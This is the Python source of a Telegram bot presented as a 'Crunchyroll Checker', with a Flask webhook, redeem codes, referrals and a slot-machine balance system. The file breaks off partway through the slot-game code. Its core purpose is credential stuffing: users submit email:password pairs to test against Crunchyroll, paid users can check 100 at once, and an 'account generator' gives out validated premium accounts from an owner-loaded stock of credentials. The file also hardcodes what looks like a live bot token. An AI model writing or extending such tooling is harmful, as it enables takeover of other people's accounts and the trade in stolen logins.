import json
import os
import requests
import telebot
import time
import threading
from uuid import uuid1
import datetime
from datetime import datetime, timedelta
import random
import string
from telebot import types
import uuid
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from threading import Timer
from telebot.apihelper import ApiTelegramException
from flask import Flask, request

#BOT TOKEN
bot = telebot.TeleBot("7308448311:AAH8PKkA9q-NAygvgZn-xtMv4AgJeEY2EAU")

#VARIABLES
authorized_users = set()
free_users = set()
user_limits = {}
cooldown = {}
cooldown_time = 30
mchk_max_free = 3
authorized_limit = 100
total_users = 0
pending_gift = {}
gift_messages = {}
redeem_codes = {}
user_data = {}
redeemed_accounts = []
owner_id = "5727462573"
USER_COOLDOWN = 21600
ACCOUNT_LIMIT = 1
owner_id2 = 5727462573
account_stock2 = []
user_balances = {}
user_last_task = {}
user_referrals = {}
user_referral_used = set()
withdraw_threshold = 2
account_stock = []

app = Flask(__name__)

@app.route('/' + bot.token, methods=['POST'])
def get_message():
    json_str = request.stream.read().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return '!', 200

@app.route("/", methods=['GET'])
def index():
    return "Bot is running!"
    
def safe_edit_message(bot, chat_id, message_id, new_text, reply_markup=None, parse_mode="HTML"):
    """
    Safely edit a message without causing a 'message is not modified' error, with parse_mode support.
    
    Args:
        bot (TeleBot): The bot instance.
        chat_id (int): The chat ID of the message.
        message_id (int): The message ID of the message to edit.
        new_text (str): The new text content for the message.
        reply_markup (InlineKeyboardMarkup, optional): The reply markup for the message.
        parse_mode (str): Parse mode for the message content (e.g., "HTML", "Markdown").
        
    Returns:
        None
    """
    try:
        # Attempt to edit the message
        bot.edit_message_text(
            text=new_text,
            chat_id=chat_id,
            message_id=message_id,
            reply_markup=reply_markup,
            parse_mode=parse_mode,
        )
    except ApiTelegramException as e:
        # Check if the error is "message is not modified"
        if "message is not modified" in str(e):
            print(f"")
        else:
            # If it's a different error, re-raise it
            raise

#FEEDBACK

CHANNEL_ID = "@bhainkarfeedback" 
@bot.message_handler(commands=['feedback'])
def ask_feedback(message):
    markup = types.InlineKeyboardMarkup(row_width=2)

    
    stars = [
        types.InlineKeyboardButton(text="🌟🌟🌟🌟🌟", callback_data="5_star"),
        types.InlineKeyboardButton(text="🌟🌟🌟🌟", callback_data="4_star"),
        types.InlineKeyboardButton(text="⭐⭐⭐", callback_data="3_star"),
        types.InlineKeyboardButton(text="⭐⭐", callback_data="2_star"),
        types.InlineKeyboardButton(text="⭐", callback_data="1_star"),
    ]
    
    markup.add(*stars)
    bot.send_message(message.chat.id, "*✨ Hey there, friend! ✨*\n\n"
                                      "Would you mind rating the bot with the stars below? 🌟\n"
                                      "_Your feedback helps us improve the bot for you and others!_ 😊", 
                                      reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.endswith("_star"))
def handle_star_rating(call):
    
    stars = call.data.split("_")[0]

  
    profile_link = f"[{call.from_user.first_name}](tg://user?id={call.from_user.id})"  
    star_emojis = "⭐" * int(stars[0])  
    
    full_feedback = f"*🎯 Feedback Received* 📩\n"
    full_feedback += f"━━━━━━━━━━━━━━━━━━\n"
    full_feedback += f"*✨ Rating*: {star_emojis} ({stars} Stars)\n"
    full_feedback += f"*🧑‍💻 User*: {profile_link}\n"
    full_feedback += f"━━━━━━━━━━━━━━━━━━\n"
    full_feedback += f"⭐ {stars} star{'s' if stars != '1' else ''} ⭐\n\n"
    full_feedback += f"_Thank you for sharing your thoughts!_ 🙏"

    
    bot.send_message(CHANNEL_ID, full_feedback, parse_mode="Markdown")

    bot.send_message(call.message.chat.id, "*💬 Thank you for your feedback, awesome human! 💬*\n\n"
                                           "_Your thoughts have been recorded successfully!_ ✨\n"
                                           "Feedbacks at @bhainkarfeedback", 
                                           parse_mode="Markdown")

    
    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)


#GIFT A MSG 
@bot.message_handler(commands=['gift'])
def initiate_gift(message):
    sender_id = message.from_user.id
    try:
        parts = message.text.split(" ", 1)
        if len(parts) < 2:
            bot.send_message(
                message.chat.id, 
                "Pʟᴇᴀsᴇ Usᴇ Tʜᴇ Fᴏʀᴍᴀᴛ:\n/gift Cʜᴀᴛ-ɪᴅ", 
                disable_web_page_preview=True
            )
            return

        username = parts[1].lstrip('@')
        recipient = bot.get_chat(username)
        recipient_id = recipient.id

        msg = bot.send_message(message.chat.id, "Pʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴇssᴀɢᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇɴᴅ ᴀs ᴀ ɢɪғᴛ.")
        bot.register_next_step_handler(msg, lambda m: process_gift_message(m, recipient_id, sender_id))

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Eʀʀᴏʀ: {str(e)}")


def process_gift_message(message, recipient_id, sender_id):
    gift_message = message.text
    unique_id = str(uuid.uuid4())
    gift_messages[unique_id] = gift_message

    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_gift:{recipient_id}:{unique_id}"),
        types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_gift")
    )

    confirmation_text = f"Pʟᴇᴀsᴇ cᴏɴғɪʀᴍ ʏᴏᴜʀ ɢɪғᴛ:\n\n{gift_message}"
    bot.send_message(message.chat.id, confirmation_text, reply_markup=markup)


@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_gift") or call.data == "cancel_gift")
def handle_gift_callback(call):
    if call.data == "cancel_gift":
        bot.send_message(call.message.chat.id, "🎁 Gɪғᴛ ᴄᴀɴᴄᴇʟʟᴇᴅ.")
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
    else:
        try:
            _, recipient_id, unique_id = call.data.split(":", 2)
            gift_message = gift_messages[unique_id]

            bot.send_message(
                recipient_id, 
                f"🎁 Yᴏᴜʀ ɢɪғᴛ ғʀᴏᴍ @{call.from_user.username}:\n\n{gift_message}", 
                disable_web_page_preview=True
            )
            bot.send_message(call.message.chat.id, "🎉 Gɪғᴛ sᴇɴᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!")
            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)

           
            del gift_messages[unique_id]

        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Eʀʀᴏʀ: {str(e)}")
       
       
#COOLDOWN TIMER OF 30SEC
def anti_spam(func):
    def wrapper(message):
        user_id = message.from_user.id
        current_time = time.time()

        if str(user_id) not in authorized_users:
            if user_id in cooldown and current_time - cooldown[user_id] < cooldown_time:
                remaining_time = int(round(cooldown_time - (current_time - cooldown[user_id])))
                bot.send_message(
                    message.chat.id, 
                    f"❌ Yᴏᴜ'ʀᴇ Oɴ Cᴏᴏʟᴅᴏᴡɴ! Tʀʏ Aɢᴀɪɴ Iɴ {remaining_time} Sᴇᴄᴏɴᴅs.",
                    disable_web_page_preview=True
                )
                return

            cooldown[user_id] = current_time

        return func(message)
    return wrapper



#REDEEMCODE LOGIC
def is_authorized(user_id):
    return user_id in authorized_users

def format_time(dt):
    return dt.strftime("%Y-%m-%d %I:%M %p")
    
def parse_duration(duration_string):
    days, hours, minutes, seconds = 0, 0, 0, 0
    for part in duration_string.split():
        if part.endswith('d'):
            days = int(part[:-1])
        elif part.endswith('h'):
            hours = int(part[:-1])
        elif part.endswith('m'):
            minutes = int(part[:-1])
        elif part.endswith('s'):
            seconds = int(part[:-1])
    return timedelta(days=days, hours=hours, minutes=minutes, seconds=seconds)

def generate_redeem_code(expiry_time, num_codes=1):
    codes = []
    for _ in range(num_codes):
        part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        code = f"BHAINKAR-{part1}-{part2}"
        redeem_codes[code] = {'used': False, 'expiry_time': expiry_time, 'user_id': None}
        codes.append(code)
    return codes
    
    #GENERATE REDEEM CODE
@bot.message_handler(commands=['gencode'])
def generate_code(message):
    user_id = str(message.from_user.id)

    if user_id == owner_id:
        bot.send_message(
            message.chat.id,
            "⏳ Set Expiry Duration\nEnter duration in this format: `3d 3h 3m` and the number of codes (e.g., `3d 5h 10` for 10 codes).",
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(message, set_code_expiry)
    else:
        bot.send_message(message.chat.id, "❌ Yᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇs.", disable_web_page_preview=True)


def set_code_expiry(message):
    try:
        parts = message.text.strip().split()
        duration = parse_duration(" ".join(parts[:-1])) 
        num_codes = int(parts[-1])  
        expiry_time = datetime.now() + duration
        codes = generate_redeem_code(expiry_time, num_codes)
        formatted_codes = "\n".join(f"➔ <code>{code}</code>" for code in codes)

        bot.send_message(
            message.chat.id,
            f"✅ <b>Redeem Codes Generated</b>\n\n"
            f"{formatted_codes}\n\n"
            f"⏳ <b>Expiry Time:</b> <code>{format_time(expiry_time)}</code>\n\n"
            f"➡️ <b>Redeem the Code by Sending This Command:</b>\n/redeem <code>BHAINKAR-XXXX-XXXX</code>\n\n"
            f"<i>Redeem From:</i> <a href='https://t.me/bhainkarcrunchyrollbot'>CRUNCHYROLL BOT</a>",
            parse_mode='HTML',
            disable_web_page_preview=True
        )
    except Exception as e:
        bot.send_message(
            message.chat.id,
            "❌ Invalid Format! Use this format: `3d 3h 3m 5` (e.g., `1d 5h 10` for 10 codes).",
            parse_mode="Markdown",
            disable_web_page_preview=True
        )

#REDEEM CMD
@bot.message_handler(commands=['redeem'])
def redeem_code(message):
    user_id = str(message.from_user.id)
    try:
        codes = message.text.split()[1:]

        if not codes:
            raise IndexError

        for code in codes:
            if code not in redeem_codes:
                bot.send_message(
                    user_id,
                    f"🚨 <b>Invalid Code Attempt</b>\n"
                    f"👤 <b>User:</b> <code>{user_id}</code>\n"
                    f"🏷️ <b>Code Entered:</b> <code>{code}</code>\n"
                    f"⚡ <i>Reason:</i> Code does not exist.",
                    parse_mode="HTML"
                )
                continue
                
            current_time = datetime.now()
            if current_time >= redeem_codes[code]['expiry_time']:
                bot.send_message(
                    user_id,
                    f"🚨 <b>Expired Code Attempt</b>\n"
                    f"👤 <b>User:</b> <code>{user_id}</code>\n"
                    f"🏷️ <b>Code Entered:</b> <code>{code}</code>\n"
                    f"⏳ <b>Expired On:</b> <code>{format_time(redeem_codes[code]['expiry_time'])}</code>",
                    parse_mode="HTML"
                )
                continue
                
            if redeem_codes[code]['used']:
                bot.send_message(
                    user_id,
                    f"🚨 <b>Used Code Attempt</b>\n"
                    f"👤 <b>User:</b> <code>{user_id}</code>\n"
                    f"🏷️ <b>Code Entered:</b> <code>{code}</code>\n"
                    f"⚡ <i>Reason:</i> Code has already been redeemed.",
                    parse_mode="HTML"
                )
                continue

            redeem_codes[code]['used'] = True
            redeem_codes[code]['user_id'] = user_id
            free_users.discard(user_id)
            authorized_users.add(user_id)

            # NOTIFY OWNER CODE REDEEMED
            bot.send_message(
                owner_id,
                f"✨ <b>Code Redeemed Successfully!</b>\n"
                f"👤 <b>User:</b> <code>{user_id}</code>\n"
                f"🏷️ <b>Redeem Code:</b> <code>{code}</code>\n"
                f"⏳ <b>Expires On:</b> {format_time(redeem_codes[code]['expiry_time'])}",
                parse_mode="HTML"
            )

            # NOTIFY USER CODE REDEEMED
            bot.send_message(
                user_id,
                "✅ <b>Code Redeemed!</b>\n🎉 You’ve successfully redeemed your premium access code. Enjoy uninterrupted benefits!",
                parse_mode="HTML"
            )

    except IndexError:
        bot.send_message(
            user_id,
            "❌ Missing Redeem Code! Use the format:\n/redeem CODE ...",
            parse_mode='HTML'
        )

#REMOVE EXPIRED USER
def remove_expired_users():
    while True:
        try:
            current_time = datetime.now()
            expired_codes = [code for code, data in redeem_codes.items() if current_time >= data['expiry_time']]

            for code in expired_codes:
                if code in redeem_codes:
                    user_id = redeem_codes[code].get('user_id')
                    if user_id and user_id in authorized_users:
                        authorized_users.remove(user_id)
                        free_users.add(user_id)

                        # NOTIFY USER EXPIRED
                        bot.send_message(
                            user_id,
                            "❌ <b>Your plan has expired!</b>\n"
                            "You’ve been moved back to the Free Plan.\n\n"
                            "Upgrade again to enjoy premium benefits.",
                            parse_mode="HTML"
                        )
                    redeem_codes.pop(code, None)

        except Exception as e:
            print(f"Error in remove_expired_users: {e}")
        threading.Event().wait(60)
        
threading.Thread(target=remove_expired_users, daemon=True).start()

#START CMD WITH REGISTER AND REFERRAL
@bot.message_handler(commands=['start'])
@bot.message_handler(commands=['start'])
def add_user(message):
    global total_users
    user_id = str(message.from_user.id)
    text_split = message.text.split()
    referrer_id = int(text_split[1]) if len(text_split) > 1 and text_split[1].isdigit() else None

    if referrer_id and referrer_id != user_id:
        if user_id not in user_referral_used: 
            user_balances[referrer_id] =  user_balances.get(referrer_id, 0) + 1  
            user_referrals[referrer_id] = user_referrals.get(referrer_id, 0) + 1
            user_referral_used.add(user_id)
            
            bot.send_message(referrer_id, f"🎉 Yᴏᴜ'ᴠᴇ ᴇᴀʀɴᴇᴅ 1 ᴄʀᴇᴅɪᴛ ғᴏʀ ʀᴇғᴇʀʀɪɴɢ ᴀ ɴᴇᴡ ᴜsᴇʀ!")
            
        else:
            bot.send_message(user_id, "❌ Yᴏᴜ ʜᴀᴠᴇ ᴀʟʀᴇᴀᴅʏ ᴜsᴇᴅ ᴀ ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋ!")
    elif referrer_id == user_id:  
        bot.send_message(user_id, "❌ Yᴏᴜ ᴄᴀɴ'ᴛ ᴜsᴇ ʏᴏᴜʀ ᴏᴡɴ ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋ!")

    if user_id not in free_users and user_id not in authorized_users:
        free_users.add(user_id)
        total_users = len(free_users) + len(authorized_users)

        bot.send_message(
            message.chat.id,
            "Wᴇʟᴄᴏᴍᴇ! Yᴏᴜ Hᴀᴠᴇ Bᴇᴇɴ Aᴅᴅᴇᴅ ᴀs ᴀ Fʀᴇᴇ Usᴇʀ.",
            disable_web_page_preview=True
        )
    else:
        bot.send_message(
            message.chat.id,
            "Yᴏᴜ Aʀᴇ Aʟʀᴇᴀᴅʏ ʀᴇɢɪsᴛᴇʀᴇᴅ!",
            disable_web_page_preview=True
        )

    # WELCOME MSG WITH ANIMATION
    chat_id = message.chat.id
    gif_url = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjR3Y3JldDhodHBhdXg4bTZyd2k4Nmt6MnQxOWhrdDR2cnJtajN1YSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/B1Lopnwqs9WIr3GtnQ/giphy.gif"
    bot.send_animation(chat_id, gif_url, caption=(
        "🎉 <b>Wᴇʟᴄᴏᴍᴇ Tᴏ CʀᴜɴᴄʜʏRᴏʟʟ Cʜᴇᴄᴋᴇʀ</b> 🎉\n"
        "\n"
        "🔍 <b>Single Check:</b> Use <code>/chk email:pass</code> to check one account.\n"
        "🔄 <b>Multi-Check:</b> Use <code>/mchk</code> to check up to 3 accounts at once.\n"
        "\n"
        "💡 <b>Fʀᴇᴇ Pʟᴀɴ:</b> 3 accounts at a time, 30s cooldown.\n"
        "🚀 <b>Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ:</b> 100 accounts at once, no cooldown. DM @bhainkar for access.\n"
        "\n"
        "ℹ️ <b>Details:</b> Use /details to check your info."
        "\n"
        "👾 <b>More Features:</b> Usᴇ /menu for more features of this bot.\n"
        "<i>Enjoy fast and accurate checking with</i> <b>CʀᴜɴᴄʜʏRᴏʟʟ Cʜᴇᴄᴋᴇʀ</b>!"
        "\n\n"
        "Bᴏᴛ Bʏ @bhainkar"
    ), parse_mode='HTML')


#SHOW THE MAIN MENU 
@bot.message_handler(commands=['menu'])
def show_menu(message):
    chat_id = message.chat.id
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 𝗦𝗧𝗔𝗧𝗦", callback_data='stats'),
        types.InlineKeyboardButton("🏆 𝗨𝗦𝗘𝗥𝗟𝗜𝗦𝗧", callback_data='lb'),
        types.InlineKeyboardButton("🆘 𝗦𝗨𝗣𝗣𝗢𝗥𝗧", callback_data='support'),
        types.InlineKeyboardButton("🔧 𝗔𝗖𝗖 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥", callback_data='open_gen_menu')
    )
    markup.add(
        types.InlineKeyboardButton("💰 𝗕𝗔𝗟𝗔𝗡𝗖𝗘", callback_data='check_balance'),
        types.InlineKeyboardButton("🎯 𝗧𝗔𝗦𝗞𝗦", callback_data='tasks'),
        types.InlineKeyboardButton("🏦 𝗪𝗜𝗧𝗛𝗗𝗥𝗔𝗪", callback_data='withdraw')
    )
    bot.send_message(
        chat_id,"<b>🚀 Choose an option:</b>\n\n- <b>📊 Stats</b>: Overview of bot stats.\n- <b>🏆 UserBoard</b>: See the top users.\n- <b>🆘 Support</b>: Get help.\n- <b>🔧 Account Generator</b>: Free Crunchyroll accounts.\n\n<b>💰 Balance</b> | <b>🏦 Withdraw</b> | <b>🎯 Tasks</b>",
        reply_markup=markup,
        parse_mode="HTML"
        )
        
        
       #ALL CALLBACK QUERY
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == 'stats':
        show_stats(call)
    elif call.data == 'lb':
        show_leaderboard(call)
    elif call.data == 'support':
        show_support(call)
    elif call.data == 'open_gen_menu':
        open_generator_menu(call)
    elif call.data == 'check_stock':
        check_account_stock(call)
    elif call.data == 'add_accounts':
        add_accounts(call)
    elif call.data == 'remove_accounts':
        remove_accounts(call)
    elif call.data == 'generate_account_as_user':
        generate_account_as_user(call)
    elif call.data == 'back_to_menu':
        back_to_menu(call)
    elif call.data == 'tasks':
    	tasks(call)
    elif call.data == 'daily_bonus':
    	daily_bonus(call)
    elif call.data == 'referral':
    	referral(call)
    elif call.data == 'withdraw':
    	withdraw(call)
    elif call.data == 'execute_withdraw':
    	execute_withdraw(call)
    elif call.data == 'add_accounts2':
    	add_accounts2(call)
    elif call.data == 'remove_accounts2':
    	remove_accounts2(call)
    elif call.data == 'slot_menu':
        slot_menu(call)
    elif call.data == 'slot_easy':
        slot_game(call, 'easy')
    elif call.data == 'slot_normal':
        slot_game(call, 'normal')
    elif call.data == 'slot_hard':
        slot_game(call, 'hard')
    elif call.data == 'check_balance':
        check_balance(call)
    elif call.data == 'balance_top_page_1':
        balance_top(call, 1)
    elif call.data.startswith('balance_top_page_'):
        page = int(call.data.split('_')[-1])
        balance_top(call, page)
    elif call.data == 'view_stock':
    	view_stock(call)
    elif call.data == 'adminview_stock':
    	adminview_stock(call)
    else:
        bot.answer_callback_query(call.id)

#OPEN ACC GEN MENU
def open_generator_menu(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📦 𝗦𝗧𝗢𝗖𝗞", callback_data='check_stock'),
        types.InlineKeyboardButton("🔄 𝗚𝗘𝗡 𝗔𝗖𝗖", callback_data='generate_account_as_user')
    )

    # Default menu message for all users
    gen_menu = (
        "🍿 <b>𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗔𝗖𝗖 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥</b>\n\n"
        "Here’s what you can do:\n"
        "🗂 <b>𝗦𝗧𝗢𝗖𝗞</b>: See how many accounts are available.\n"
        "🔄 <b>𝗚𝗘𝗡 𝗔𝗖𝗖</b>: Redeem an account.\n\n"
        "<i>Enjoy fast, seamless account generation!</i>"
    )

    # Add owner-specific buttons if user is the owner
    if call.from_user.id == owner_id2:
        markup.add(
            types.InlineKeyboardButton("➕ 𝗔𝗗𝗗", callback_data='add_accounts'),
            types.InlineKeyboardButton("➖ 𝗥𝗘𝗠𝗢𝗩𝗘", callback_data='remove_accounts')
        )
        
    # Add the back button
    markup.add(types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data='back_to_menu'))

    # Send the menu message
    safe_edit_message(bot, chat_id, message_id, gen_menu, reply_markup=markup, parse_mode="HTML")



def back_button_markup():
    return types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data="back_to_menu")
    )

#CHECK ACC STOCK 1
def check_account_stock(call):
    available_count = len(account_stock)
    bot.send_message(
        chat_id=call.message.chat.id,
        text=f"🗂 <b>Aᴄᴄᴏᴜɴᴛ Sᴛᴏᴄᴋ</b>: <b>{available_count}</b> Aᴄᴄᴏᴜɴᴛs ᴀᴠᴀɪʟᴀʙʟᴇ.",
        parse_mode="HTML"
    )

# ADD ACCOUNTS HANDLER
def add_accounts(call):
    if call.from_user.id != owner_id2:
        bot.send_message(call.message.chat.id, "❌ This option is for owners only.")
        return

    bot.send_message(
        chat_id=call.message.chat.id,
        text="➕ Add accounts one per line in the format:\n\n<code>email:password</code>",
        parse_mode="HTML"
    )
    bot.register_next_step_handler(call.message, process_add_accounts)

# PROCESS ADD ACCOUNTS
def process_add_accounts(message):
    global account_stock 
    accounts = message.text.splitlines()
    formatted_accounts = [account.strip() for account in accounts if ":" in account]
    account_stock.extend(formatted_accounts)  
    
    bot.send_message(
        chat_id=message.chat.id,
        text=f"✅ Successfully added {len(formatted_accounts)} accounts."
    )

# REMOVE ACCOUNTS HANDLER
def remove_accounts(call):
    if call.from_user.id != owner_id2:
        bot.send_message(call.message.chat.id, "❌ This option is for owners only.")
        return

    bot.send_message(
        chat_id=call.message.chat.id,
        text="➖ Send the accounts to remove (one per line)."
    )
    bot.register_next_step_handler(call.message, process_remove_accounts)

# PROCESS REMOVE ACCOUNTS
def process_remove_accounts(message):
    global account_stock 
    accounts = message.text.splitlines()
    removed_count = sum(1 for account in accounts if account in account_stock)
    
    account_stock = [account for account in account_stock if account not in accounts]

    bot.send_message(
        chat_id=message.chat.id,
        text=f"✅ Successfully removed {removed_count} accounts."
    )

#GEN ACC AS USER 
def generate_account_as_user(call):
    user_id = call.from_user.id
    if user_id not in user_data:
        user_data[user_id] = {'last_generated': None}
    now = datetime.now()

    if user_data[user_id]['last_generated'] and (now < user_data[user_id]['last_generated'] + timedelta(seconds=USER_COOLDOWN)):
        remaining_time = (user_data[user_id]['last_generated'] + timedelta(seconds=USER_COOLDOWN)) - now

        sent_message = bot.send_message(call.message.chat.id, "Cᴀʟᴄᴜʟᴀᴛɪɴɢ ᴄᴏᴏʟᴅᴏᴡɴ...")

        def update_timer():
            nonlocal sent_message
            remaining_time = (user_data[user_id]['last_generated'] + timedelta(seconds=USER_COOLDOWN)) - datetime.now()

            if remaining_time.total_seconds() <= 0:
                bot.edit_message_text(
                    chat_id=sent_message.chat.id,
                    message_id=sent_message.message_id,
                    text="✅ Yᴏᴜ ᴄᴀɴ ɴᴏᴡ ɢᴇɴᴇʀᴀᴛᴇ ᴀ ɴᴇᴡ ᴀᴄᴄᴏᴜɴᴛ."
                )
            else:
                hours, remainder = divmod(int(remaining_time.total_seconds()), 3600)
                minutes, seconds = divmod(remainder, 60)
                try:
                    bot.edit_message_text(
                        chat_id=sent_message.chat.id,
                        message_id=sent_message.message_id,
                        text=f"⏳ Pʟᴇᴀsᴇ ᴡᴀɪᴛ {hours}h {minutes}m {seconds}s."
                    )
                except Exception as e:
                    print(f"Error updating message: {e}")
                Timer(1, update_timer).start()

        update_timer()
        return

    if not account_stock:
        bot.send_message(
            call.message.chat.id,
            "📦Nᴏ Aᴄᴄᴏᴜɴᴛs Aᴠᴀɪʟᴀʙʟᴇ\n⚠️ Wᴇ'ʀᴇ ᴄᴜʀʀᴇɴᴛʟʏ ᴏᴜᴛ ᴏғ ᴀᴄᴄᴏᴜɴᴛs ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ.\nPʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ ᴏʀ ᴄᴏɴᴛᴀᴄᴛ sᴜᴘᴘᴏʀᴛ ɪғ ᴛʜᴇ ɪssᴜᴇ ᴘʀᴇsɪsᴛs."
        )
        return

    while account_stock:
        account = account_stock.pop(0)
        email, pasw = account.split(":", 1)
        check_result = check_crunchyroll_account(email, pasw, call.message)
        if "Cʀᴜɴᴄʜʏʀᴏʟʟ ᥫ᭡ Pʀᴇᴍɪᴜᴍ" in check_result:
            bot.send_message(call.message.chat.id, check_result, parse_mode='HTML')
            user_data[user_id]['last_generated'] = now
            break
    else:
        bot.send_message(call.message.chat.id, "❌ No premium accounts found.")

#SHOW STATS BUTTON
def show_stats(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    total_users = len(authorized_users) + len(free_users)
    stats_text = (
        f"📊 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦:\n\n"
        f"👥 <b>Tᴏᴛᴀʟ Usᴇʀ</b>: {total_users}\n"
        f"🆓 <b>Fʀᴇᴇ Pʟᴀɴ</b>: {len(free_users)}\n"
        f"⭐ <b>Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ</b>: {len(authorized_users)}"
    )

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data='back_to_menu'))

    safe_edit_message(bot, chat_id, message_id, stats_text, reply_markup=markup, parse_mode="HTML")

#SHOW USERLIST BOARD
def show_leaderboard(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    if not free_users and not authorized_users:
        leaderboard_message = "Nᴏ ᴜsᴇʀs ʏᴇᴛ."
    else:
        leaderboard_message = "🏆 𝗨𝗦𝗘𝗥𝗟𝗜𝗦𝗧\n\n"
    for user_id in free_users:
        try:
            user = bot.get_chat(user_id)  
            first_name = user.first_name 
            
            safe_first_name = first_name.replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]').replace('`', '\\`')
            leaderboard_message += f"🆓 Fʀᴇᴇ Pʟᴀɴ:\n» [{safe_first_name}](tg://user?id={user_id}) 𝙸𝙳: {user_id}\n"
        except Exception as e:
            print(f"Fᴀɪʟᴇᴅ ᴛᴏ ɢᴇᴛ ᴜsᴇʀ {user_id}: {e}")

    for user_id in authorized_users:
        try:
            user = bot.get_chat(user_id)  
            first_name = user.first_name 
            
            safe_first_name = first_name.replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]').replace('`', '\\`')
            leaderboard_message += f"⭐ Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ:\n» [{safe_first_name}](tg://user?id={user_id}) 𝙸𝙳: {user_id}\n"
        except Exception as e:
            print(f"Fᴀɪʟᴇᴅ ᴛᴏ ɢᴇᴛ ᴜsᴇʀ {user_id}: {e}")


    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data='back_to_menu'))

    safe_edit_message(bot, chat_id, message_id, leaderboard_message, reply_markup=markup, parse_mode="Markdown")
    
    
#SHOW SUPPORT BUTTON
def show_support(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    support_message = (
        "🆘 <b>𝗦𝗨𝗣𝗣𝗢𝗥𝗧</b>\n\n"
        "Need help? Contact us via:\n\n"
        "💬 <b>Live Chat:</b> @bhainkar\n"
        "📧 <b>Email:</b> 3xzaniga@gmail.com"
    )

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data='back_to_menu'))

    safe_edit_message(bot, chat_id, message_id, support_message, reply_markup=markup, parse_mode="HTML")


#ADD BALANCE BUTTON 
@bot.message_handler(commands=['addbal'])
def add_balance(message):
    if message.chat.id != owner_id2:
        bot.reply_to(message, "Unauthorized access. This command is only available to the owner.")
        return

    msg = bot.reply_to(message, "Enter the user's chat ID:")
    bot.register_next_step_handler(msg, process_chat_id)

def process_chat_id(message):
    try:
        target_chat_id = int(message.text)
        msg = bot.reply_to(message, f"Enter the amount to add to user {target_chat_id}'s balance:")
        bot.register_next_step_handler(msg, process_amount, target_chat_id)
    except ValueError:
        bot.reply_to(message, "Invalid chat ID. Please enter a valid number.")

def process_amount(message, target_chat_id):
    try:
        amount = float(message.text)  
        if target_chat_id not in user_balances:
            user_balances[target_chat_id] = 0.0  
        user_balances[target_chat_id] += amount  
        
        bot.reply_to(message, f"Successfully added {amount} to user {target_chat_id}'s balance.\nNew Balance: {user_balances[target_chat_id]}")
    except ValueError:
        bot.reply_to(message, "Invalid amount. Please enter a valid number.")
        
        #SLOT MACHINE EVERYTHING
def format_amount(amount):
    return round(amount, 2)
    
slot_symbols = ["🍎", "🍋", "🍇", "🔔", "⭐", "💎", "🍀", "🎲", "🔥"]

#SLOT MENU DISPLAY
def slot_display(spins):
    top_row = f"        {spins[0][0]}  |  {spins[0][1]}  |  {spins[0][2]}"
    middle_row = f" »»» {spins[1][0]}  |  {spins[1][1]}  |  {spins[1][2]} «««"
    bottom_row = f"        {spins[2][0]}  |  {spins[2][1]}  |  {spins[2][2]}"
    return f"{top_row}\n{middle_row}\n{bottom_row}"


# SLOT GAME 
def slot_game(call, difficulty):
    chat_id = call.message.chat.id
    user_id = call.from_user.id

    user_balance = user_balances.get(user_id, 0) 
    
